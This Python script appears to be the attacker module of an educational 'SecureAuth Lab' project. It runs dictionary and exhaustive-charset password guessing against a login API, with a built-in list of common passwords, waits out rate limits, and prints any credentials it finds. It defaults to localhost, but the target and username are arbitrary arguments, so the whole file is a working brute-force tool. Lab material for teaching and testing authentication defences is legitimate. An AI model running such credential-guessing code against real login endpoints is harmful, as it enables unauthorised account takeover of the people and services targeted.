"""
SecureAuth Lab — Brute Force Attack Simulation Module
======================================================
Educational tool that simulates automated login attempts against
the SecureAuth Lab server to demonstrate authentication vulnerabilities.

Usage:
  python attacker.py --target http://localhost:8000 --username admin --mode dictionary
  python attacker.py --target http://localhost:8000 --username admin --mode charset --max-len 4
"""

import requests
import itertools
import string
import time
import argparse
from datetime import datetime
from report import AttackReport

# ── Default word list (dictionary mode) ────────────────────────────────────────
DEFAULT_WORDLIST = [
    "password", "123456", "admin", "admin123", "password1",
    "letmein", "qwerty", "abc123", "monkey", "1234567890",
    "iloveyou", "sunshine", "princess", "welcome", "shadow",
    "superman", "master", "hello", "dragon", "pass123",
    "secure", "secure1", "secure12", "secure123",
    "Admin@1234", "Test@123", "root", "toor", "test",
]


class BruteForceAttacker:
    def __init__(self, target_url: str, username: str, delay: float = 0.1):
        self.target_url  = target_url.rstrip('/') + '/api/auth/login/'
        self.username    = username
        self.delay       = delay  # seconds between attempts
        self.report      = AttackReport(username, target_url)

    def _attempt_login(self, password: str) -> bool:
        """Send one login request. Returns True if successful."""
        try:
            resp = requests.post(
                self.target_url,
                json={'username': self.username, 'password': password},
                timeout=5,
                headers={'Content-Type': 'application/json'},
            )
            if resp.status_code == 200:
                return True
            elif resp.status_code == 429:
                print(f'  [BLOCKED] Rate limited by server. Waiting 10s...')
                time.sleep(10)
            return False
        except requests.exceptions.ConnectionError:
            print(f'  [ERROR] Cannot connect to server at {self.target_url}')
            return False

    def dictionary_attack(self, wordlist: list = None) -> dict:
        """Try passwords from a predefined word list."""
        wordlist = wordlist or DEFAULT_WORDLIST
        print(f'\n[*] Starting DICTIONARY attack on user "{self.username}"')
        print(f'[*] Wordlist size: {len(wordlist)} passwords\n')

        self.report.start()

        for password in wordlist:
            self.report.record_attempt(password)
            print(f'  Trying: {password:<30}', end='\r')

            if self._attempt_login(password):
                self.report.record_success(password)
                self._print_success(password)
                return self.report.summary()

            time.sleep(self.delay)

        self.report.record_failure()
        self._print_failure()
        return self.report.summary()

    def charset_attack(self, max_len: int = 4, charset: str = None) -> dict:
        """Try all combinations up to max_len characters."""
        charset = charset or (string.ascii_lowercase + string.digits)
        total   = sum(len(charset) ** i for i in range(1, max_len + 1))

        print(f'\n[*] Starting CHARSET attack on user "{self.username}"')
        print(f'[*] Character set : {charset}')
        print(f'[*] Max length    : {max_len}')
        print(f'[*] Total combos  : {total:,}\n')

        self.report.start()

        for length in range(1, max_len + 1):
            for combo in itertools.product(charset, repeat=length):
                password = ''.join(combo)
                self.report.record_attempt(password)
                print(f'  Trying: {password:<20} Attempts: {self.report.attempts:,}', end='\r')

                if self._attempt_login(password):
                    self.report.record_success(password)
                    self._print_success(password)
                    return self.report.summary()

                time.sleep(self.delay)

        self.report.record_failure()
        self._print_failure()
        return self.report.summary()

    def _print_success(self, password):
        s = self.report.summary()
        print(f'\n\n{"=" * 55}')
        print(f'  ✓  PASSWORD FOUND!')
        print(f'{"=" * 55}')
        print(f'  Username  : {self.username}')
        print(f'  Password  : {password}')
        print(f'  Attempts  : {s["attempts"]:,}')
        print(f'  Time      : {s["elapsed_seconds"]:.2f}s')
        print(f'  Speed     : {s["attempts_per_second"]:.0f} attempts/sec')
        print(f'{"=" * 55}\n')

    def _print_failure(self):
        s = self.report.summary()
        print(f'\n\n{"=" * 55}')
        print(f'  ✗  PASSWORD NOT FOUND')
        print(f'{"=" * 55}')
        print(f'  Attempts  : {s["attempts"]:,}')
        print(f'  Time      : {s["elapsed_seconds"]:.2f}s')
        print(f'{"=" * 55}\n')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SecureAuth Lab — Brute Force Module')
    parser.add_argument('--target',   default='http://localhost:8000', help='Server URL')
    parser.add_argument('--username', default='admin',                 help='Target username')
    parser.add_argument('--mode',     choices=['dictionary', 'charset'], default='dictionary')
    parser.add_argument('--max-len',  type=int, default=4,             help='Max password length (charset mode)')
    parser.add_argument('--delay',    type=float, default=0.05,        help='Delay between attempts (seconds)')
    args = parser.parse_args()

    attacker = BruteForceAttacker(args.target, args.username, args.delay)

    if args.mode == 'dictionary':
        result = attacker.dictionary_attack()
    else:
        result = attacker.charset_attack(max_len=args.max_len)

    print('\n[Report Summary]')
    for k, v in result.items():
        print(f'  {k:25}: {v}')
